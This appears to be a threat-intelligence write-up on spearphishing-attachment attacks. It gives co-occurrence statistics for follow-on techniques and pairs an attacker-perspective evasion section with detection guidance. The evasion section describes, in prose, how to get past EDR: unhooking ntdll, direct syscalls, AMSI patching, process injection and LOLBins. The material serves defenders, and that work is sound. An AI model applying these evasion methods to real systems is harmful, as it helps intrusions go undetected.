+* **Rationale:** Malware often relies on DNS to resolve the addresses of C2 servers or access malicious resources. Detecting DNS queries to suspicious domains, especially dynamic DNS or newly registered domains, can indicate C2 communication attempts or access to attacker infrastructure after a system has been compromised by a spearphishing attachment.
+
+## Co-Occurence Analysis
+
+This analysis examines the co-occurrence data associated with the Initial Access technique `Spearphishing Attachment`, shedding light on the common behavioral patterns adversaries exhibit when employing this method. By interpreting the Co-Occurrence Count, Conditional Likelihood, and Degree Centrality of paired techniques, we can construct a richer narrative of how attackers typically chain their actions following a successful spearphishing attachment delivery.
+
+The use of `Spearphishing Attachment` is fundamentally linked to the delivery of a `Malicious File`. This pairing exhibits the highest observed Co-Occurrence Count (135) where `Spearphishing Attachment` is the first technique, and an exceptionally high Conditional Likelihood (**96.3%**) of seeing `Malicious File` once `Spearphishing Attachment` is observed. This signifies that the attachment _is_ the malicious file or its container in nearly all observed instances. The high Degree Centrality (**71.83%**) for this pair indicates that both techniques are frequently involved in various attack chains, acting as central hubs in adversary operations. Conversely, observing a `Malicious File` strongly suggests `Spearphishing Attachment` might have been the delivery vector, with a Conditional Likelihood of **76.02%** (Co-Occurrence Count 171).
+
+Following the delivery via the attachment, adversaries commonly rely on scripting engines for execution. The data reveals strong connections between `Spearphishing Attachment` and subsequent execution techniques. There is a **54.81%** Conditional Likelihood of observing `Windows Command Shell` execution following `Spearphishing Attachment` (Co-Occurrence Count 135). Similarly, the use of `Visual Basic` (often associated with macros) follows `Spearphishing Attachment` with a **51.85%** Conditional Likelihood (Co-Occurrence Count 135). `PowerShell` usage also frequently follows, with a **50.37%** Conditional Likelihood (Co-Occurrence Count 135). The high Degree Centrality scores for `Windows Command Shell` (**76.13%**) and `PowerShell` (**75.9%**) suggest these are versatile tools used commonly across many attack types, while the slightly lower centrality for `Visual Basic` (**69.23%**) might point towards its more specific role in document-based macro execution following phishing.
+
+To establish communication or download further payloads after initial execution, attackers frequently leverage standard network protocols. The technique `Web Protocols` shows a high Co-Occurrence Count (135) and a **54.07%** Conditional Likelihood following `Spearphishing Attachment`. Its very high Degree Centrality (**77.6%**) underscores the ubiquity of using HTTP/S for command and control or fetching second-stage malware. This indicates a common immediate step after code execution is achieved via the attachment.
+
+Defense evasion techniques are intrinsically tied to the success of `Spearphishing Attachment`. Attackers often need to unpack or hide their payloads. `Deobfuscate/Decode Files or Information` follows `Spearphishing Attachment` with a **48.89%** Conditional Likelihood (Co-Occurrence Count 135), supported by a high Degree Centrality (**75.57%**), suggesting that obfuscation is a standard component delivered via attachments. Persistence mechanisms are also frequently established soon after initial access. `Scheduled Task` has a **41.48%** Conditional Likelihood (Co-Occurrence Count 135), and `Registry Run Keys` appears with a **37.78%** Conditional Likelihood (Co-Occurrence Count 135) following `Spearphishing Attachment`. Both are common persistence methods with relatively high Degree Centrality scores (**73.87%** and **70.48%** respectively).
+
+While `Spearphishing Attachment` itself initiates the attack, certain specialized techniques show a very high likelihood of preceding or enabling it, albeit with lower frequency. For instance, `Template Injection` (Co-Occurrence Count 11) and `XSL Script Processing` (Co-Occurrence Count 4) both have a **100%** Conditional Likelihood of being associated with `Spearphishing Attachment` when they are observed. These represent specific implementation methods often embedded within the malicious documents delivered via spearphishing. Their lower Co-Occurrence Counts and moderate-to-low Degree Centrality (**52.6%** and **43.1%** respectively) suggest they are more niche but highly indicative precursors when detected. Similarly, `Exploitation for Client Execution` has a high Conditional Likelihood (**73.58%**) of preceding `Spearphishing Attachment` (Co-Occurrence Count 53), reinforcing that exploits are frequently packaged within these attachments.
+
+Interestingly, the data shows a notable relationship between different types of spearphishing. `Spearphishing Link` has a **71.62%** Conditional Likelihood of co-occurring with `Spearphishing Attachment` when the link is observed first (Co-Occurrence Count 74). Similarly, `Malicious Link` exhibits a **67.09%** Conditional Likelihood (Co-Occurrence Count 79). This suggests that attackers may use both attachment-based and link-based spearphishing tactics within the same campaign, perhaps targeting different users or as fallback options. Their moderate Degree Centrality (**67.08%** and **66.52%**) reflects their common usage as initial access vectors.
+
+**Implications for Security Analysis and Defense**
+
+**Detection & Prevention Focus:** When `Spearphishing Attachment` is detected or suspected, defensive measures should prioritize monitoring for activities with the highest Conditional Likelihood of following. Based on the data, these are overwhelmingly `Malicious File` (**96.3%**), followed by execution via `Windows Command Shell` (**54.81%**), communication using `Web Protocols` (**54.07%**), execution via `Visual Basic` (**51.85%**), execution via `PowerShell` (**50.37%**), and payload handling via `Deobfuscate/Decode Files or Information` (**48.89%**). Detecting these subsequent actions significantly increases the chance of identifying a compromise originating from an attachment. Preventing the execution associated with macros (`Visual Basic`) or common scripting (`Windows Command Shell`, `PowerShell`) can disrupt a large portion of these attack chains.
+
+**Threat Hunting:** Observing certain precursor or enabling techniques provides strong leads for hunting `Spearphishing Attachment`. Techniques like `Template Injection` (**100%** CL), `XSL Script Processing` (**100%** CL), `Compiled HTML File` (**83.33%** CL), `Internal Spearphishing` (**80%** CL), `Dynamic Data Exchange` (**75%** CL), and `Exploitation for Client Execution` (**73.58%** CL), when detected, have a high Conditional Likelihood of being associated with `Spearphishing Attachment`, even if their overall occurrence is lower. The frequent co-occurrence and high Conditional Likelihood (**76.02%**) of `Malicious File` leading to `Spearphishing Attachment` make file analysis crucial. Observing `Spearphishing Link` (**71.62%** CL) or `Malicious Link` (**67.09%** CL) can also suggest concurrent `Spearphishing Attachment` activity within the same campaign. Prioritizing hunts based on high Co-Occurrence Count pairs like (`Malicious File`, `Spearphishing Attachment`) focuses efforts on the most common patterns.
+
+**Understanding Attacker Mindset:** The data strongly suggests a common playbook following `Spearphishing Attachment`. Adversaries deliver a `Malicious File` via the attachment, then very commonly use scripting (`Windows Command Shell`, `Visual Basic`, `PowerShell`) for execution. This is often followed by attempts to communicate outbound using standard `Web Protocols` and may involve `Deobfuscate/Decode Files or Information` to unpack payloads. Establishing persistence via methods like `Scheduled Task` is also a frequent follow-on objective. This reveals a pattern focused on achieving code execution through common system tools immediately after the user interacts with the malicious attachment, followed quickly by C2 communication and persistence steps.
+
+## Technique Internals: Evasion and Detection Logic
+
+**Evasion (Attacker's Perspective)**
+
+**Exploiting API/OS Internals for Stealth:**
+
+* **File Operations (`CreateFileW`, `WriteFile`):** When writing downloaded payloads or intermediate files, avoid predictable locations like `%TEMP%` if alternative writable directories exist. Use generic file names instead of obvious ones like `payload.exe`. Request minimum necessary access rights via `dwDesiredAccess` in `CreateFileW` (e.g., `GENERIC_WRITE` only, not `GENERIC_ALL`). Leverage `FILE_FLAG_DELETE_ON_CLOSE` if the file is truly transient, potentially reducing forensic traces. Use `NULL` for `lpSecurityAttributes` to inherit default security, which is less likely to trigger specific DACL monitoring rules. File mapping APIs (`CreateFileMappingW`, `MapViewOfFile`) can be an alternative to standard `WriteFile` for staging larger payloads in memory mapped to a file, possibly altering I/O patterns monitored by file system filters hooked onto `NtReadFile`/`NtWriteFile`.
+* **Process Creation (`CreateProcessW`, `ShellExecuteExW`):** Instead of directly calling `CreateProcessW` from a macro (which is heavily scrutinized), leverage COM objects (via `CoCreateInstance` -> `IDispatch::Invoke`) like `Shell.Application`'s `ShellExecute` method, or WMI's `Win32_Process::Create`. These routes achieve process creation via different intermediate OS components and APIs, potentially bypassing simple hooks on `CreateProcessW` itself. When `CreateProcessW` _is_ used, manipulate `dwCreationFlags` (e.g., `CREATE_NO_WINDOW`) and `STARTUPINFO` structure (e.g., `wShowWindow = SW_HIDE`) to hide console windows. Use `lpCurrentDirectory` to control the initial working directory, potentially resolving relative paths unexpectedly for defenders. For LNK/Executable based attachments, carefully craft the arguments in `IShellLinkW::SetArguments` to include obfuscated commands or leverage LOLBins that are less likely to be blocked outright.
+* **Network Communication (`WinINet`, `WinHTTP`, `Winsock`):** Favor `WinHTTP` over `WinINet`, as the former is less commonly used by typical desktop applications and might receive less scrutiny or have fewer high-level logging options enabled by default. For greater stealth, avoid these higher-level libraries altogether and use raw `Winsock` (`socket`, `connect`, `send`, `recv`). This bypasses library-level hooks and common User-Agent based detections. The ultimate stealth involves crafting raw TCP/IP packets or using direct calls to `NtDeviceIoControlFile` targeting the Ancillary Function Driver (AFD) for network I/O, completely bypassing Winsock layers but requiring significant implementation effort. Encrypt C2 traffic and use common ports (80, 443) to blend in.
+* **Memory Operations (Exploits - `VirtualAlloc`, `VirtualProtect`):** Allocate memory as ReadWrite (`PAGE_READWRITE`) using `VirtualAlloc(Ex)`, write the shellcode using `WriteProcessMemory` or direct memory pointers, and _then_ change permissions to ExecuteRead (`PAGE_EXECUTE_READ`) using `VirtualProtect(Ex)`. Avoid allocating ReadWriteExecute (`PAGE_EXECUTE_READWRITE`) directly, as this is a highly suspicious indicator often flagged by EDRs monitoring `NtAllocateVirtualMemory` and `NtProtectVirtualMemory`. Exploit chains might use ROP (Return Oriented Programming) to call existing executable code snippets within the process, avoiding the need for direct allocation of new executable pages altogether until later stages.
+* **COM (`CoCreateInstance`, `IDispatch::Invoke`):** Avoid classic `WScript.Shell` or `MSXML2.XMLHTTP`. Explore less common but functional COM objects for execution (`ShellBrowserWindow`, `MMC20.Application`), file download (`BITS.BackgroundCopyManager`), or WMI interaction (`WbemScripting.SWbemLocator`). Understanding that VBA's `CreateObject` maps to `CoCreateInstance` and method calls map to `IDispatch::Invoke` helps in finding alternative objects that might not be explicitly monitored or blocked by policy.
+* **AMSI Bypass (`AmsiScanBuffer`/`String`):** Since the Office VBA host or PowerShell may call AMSI, employ known AMSI bypass techniques before executing malicious script content. This can involve memory patching of the `AmsiScanBuffer` function itself within the current process, exploiting implementation flaws in AMSI, fragmenting code so individual scanned chunks appear benign, or using heavily obfuscated code that confuses the AMSI signature engines.
+
+**Anticipating and Bypassing Defenses:**
+
+* **Hooking:** Defenders commonly hook Win32 APIs like `CreateProcessW`, `ShellExecuteExW`, `VirtualAlloc`, `WriteFile`, and network APIs in user mode. Anticipate this by:
+  * Implementing unhooking routines (e.g., reading `ntdll.dll` from disk and overwriting the hooked `.text` section in memory).
+  * Using direct system calls (e.g., finding syscall numbers for `NtCreateUserProcess`, `NtWriteFile`, `NtAllocateVirtualMemory`) to invoke kernel functions directly, bypassing user-mode hooks entirely.
+  * Leveraging alternative APIs or methods (COM, WMI) that achieve the same goal through different call paths that might not be hooked.
+* **Kernel Callbacks:** Defenders use kernel callbacks (`PsSetCreateProcessNotifyRoutineEx`, `PsSetLoadImageNotifyRoutine`, file system filter drivers monitoring `NtCreateFile`/`NtWriteFile`, WFP/TDI filters monitoring `NtDeviceIoControlFile` for network). Bypassing these is harder but could involve:
+  * Exploiting kernel vulnerabilities to disable or tamper with these callbacks (highly risky and complex).
+  * Using techniques that don't trigger specific callbacks, e.g., reflective DLL loading avoids `LoadLibrary` and thus `PsSetLoadImageNotifyRoutine`. Process injection techniques might bypass certain aspects of process creation monitoring depending on the method.
+  * For file I/O, using fileless techniques where the payload never touches the disk in a way easily monitored by standard file filters (e.g., loading via network directly into memory allocated by `VirtualAlloc`).
+* **Behavioral Rules:** Defenders look for Office spawning `cmd.exe`/`powershell.exe`, Office writing executables, Office making network calls. Circumvent these by:
+  * Using alternative LOLBins (`wmic`, `certutil`, `mshta`) instead of `cmd`/`powershell`.
+  * Executing code entirely within the Office process memory space (macros calling Win32 APIs directly via `Declare`, or shellcode from exploits).
+  * Using process injection to run payloads under the context of a more common process like `explorer.exe` or `svchost.exe`.
+  * Avoiding direct file writes; download payloads directly into memory or use steganography within seemingly benign files.
+
+**Detection (Defender's Perspective)**
+
+**Identifying Core Telemetry via OS Fundamentals:**
+
+* **Process Creation:** Regardless of whether `CreateProcessW`, `ShellExecuteExW`, COM, or WMI is used, the underlying action _must_ eventually involve the kernel creating a process, typically via `NtCreateUserProcess`. Monitoring process creation events via kernel callbacks (`PsSetCreateProcessNotifyRoutineEx`) provides the most fundamental visibility into new process execution originating from potentially compromised Office applications or exploit payloads. Focus on Parent-Child relationships (e.g., `WINWORD.EXE` -> `powershell.exe`) and command-line arguments.
+* **File System Activity:** Dropping payloads, decoy documents, or intermediate script files involves file system operations. Kernel-level file system filter drivers monitoring `NtCreateFile` and `NtWriteFile` provide fundamental visibility. Monitoring writes of executable file types (`.exe`, `.dll`, `.scr`, `.ps1`, `.bat`) or suspicious extensions (`.iso`, `.lnk` inside archives) to disk, especially by productivity applications (Office, PDF readers), is crucial, regardless of the specific Win32 API (`CreateFileW`, `WriteFile`, `IPersistFile::Save`) used by the attacker. Monitoring writes to user-writable locations like `%TEMP%`, `%APPDATA%`, `%PUBLIC%` is key.
+* **Network Activity:** Whether WinINet, WinHTTP, Winsock, or direct AFD calls are used, network traffic ultimately flows through the kernel's networking stack. Monitoring network connections via kernel mechanisms like Windows Filtering Platform (WFP) or older TDI filters (which see `NtDeviceIoControlFile` calls to AFD) provides fundamental visibility. Look for connections initiated by unusual processes (Office, PDF readers, LOLBins spawned by them) to external IPs, especially those with poor reputation or using non-standard ports/protocols.
+* **Memory Changes (Exploits):** Exploits needing to execute shellcode often require allocating executable memory (`NtAllocateVirtualMemory`) or changing existing memory permissions (`NtProtectVirtualMemory`). Monitoring these kernel functions for processes like Office applications requesting executable permissions (`PAGE_EXECUTE*`), especially `PAGE_EXECUTE_READWRITE`, is a fundamental detection strategy for memory corruption exploits.
+* **Image Loading:** Monitoring DLL loads via `PsSetLoadImageNotifyRoutine` can detect suspicious or unknown DLLs being loaded by Office applications, which might indicate exploit activity or payload execution.
+
+**Achieving Comprehensive Visibility:**
+
+* The wide range of functions (`CreateProcessW`, `ShellExecuteExW`, COM, `NtCreateUserProcess`, `IShellLinkW`, etc.) used to execute code or drop files highlights that relying solely on user-mode API hooking of, say, `CreateProcessW` is insufficient. An attacker might use COM, WMI, or direct syscalls (`NtCreateUserProcess`) to bypass those hooks. Similarly, monitoring only `CreateFileW` misses payloads staged via file mappings or potentially even direct registry writes for some persistence types (though less common for initial payload). Network monitoring at the WinINet/WinHTTP level misses raw Winsock or direct AFD usage.
+* Therefore, a layered approach combining multiple telemetry sources is essential:
+  * **Kernel Callbacks:** Fundamental ground truth for process creation, image loads, file I/O, registry changes, network connections (via WFP/TDI).
+  * **User-Mode API Monitoring (ETW/Hooking):** Provides richer context like specific function parameters (command lines, URLs, file paths, COM CLSIDs) that might be abstracted at the kernel level. Useful for WinINet/WinHTTP/COM calls.
+  * **Script Logging:** AMSI integration and PowerShell script block logging capture the content of scripts executed via macros or LOLBins.
+  * **Memory Scanning:** Periodically scan process memory for indicators of compromise (IOCs), shellcode patterns, or evidence of unhooking/tampering, especially in high-risk processes like Office applications after opening documents.
+  * **Network Traffic Analysis:** Inspecting NetFlow, proxy logs, and potentially full packet capture (PCAP) provides visibility independent of endpoint sensors.
+
+**Developing High-Fidelity Behavioral Detections:**
+
+* **Contextualize Process Events:** Enrich `NtCreateUserProcess` events with command-line arguments and parent process information. A rule like "`WINWORD.EXE` (Parent) spawning `powershell.exe` (Child) with `-enc` or `-nop` (Args)" is much higher fidelity than just seeing `powershell.exe` start. Similarly, track process ancestry; an `mshta.exe` process spawned by `OUTLOOK.EXE` is more suspicious than one spawned by `explorer.exe`.
+* **Analyze File Operations:** Don't just log `NtCreateFile`; analyze the _context_. An Office application (`WINWORD.EXE`, `EXCEL.EXE`) writing a file with a `.exe`, `.dll`, `.ps1`, or `.js` extension, especially to `%TEMP%` or user profile directories, is highly suspicious. Correlate this file write with subsequent process creation events involving that file path. The `dwDesiredAccess` parameter `GENERIC_WRITE` combined with executable file extensions from an unexpected parent is a strong signal.
+* **Scrutinize Network Connections:** Enrich network events (`NtDeviceIoControlFile` via WFP/TDI, or higher-level logs) with the initiating process. An Office application or a commonly abused LOLBin (`certutil.exe`, `bitsadmin.exe`) making direct connections to external IPs (especially non-standard ports or IPs with poor reputation) is a strong indicator of C2 activity following successful execution. Analyze HTTP headers (User-Agent) from WinINet/WinHTTP calls for anomalies.
+* **Leverage Memory Allocation Patterns:** Exploits often follow a pattern: `NtAllocateVirtualMemory` (RW) -> `NtWriteVirtualMemory` (Payload) -> `NtProtectVirtualMemory` (RX/X). Detecting this sequence within an Office process, especially if the source of the written data is unusual or the allocated region contains suspicious byte patterns (e.g., NOP sleds), can indicate exploitation attempts. Allocation of `PAGE_EXECUTE_READWRITE` is a very strong flag.
+* **Monitor COM Object Instantiation:** Log `CoCreateInstance` calls (often via ETW or API hooks). Alert on Office applications instantiating known high-risk COM objects (`WScript.Shell`, scripting engines, `ShellBrowserWindow`, BITS objects) that are commonly abused by macros for execution, file download, or persistence.
+* **Correlate AMSI/Script Logs:** Combine AMSI detections or suspicious script block logs with originating process context. An AMSI hit from VBA within `WINWORD.EXE`, followed by `WINWORD.EXE` spawning `powershell.exe` or making a network connection, builds a compelling detection narrative.
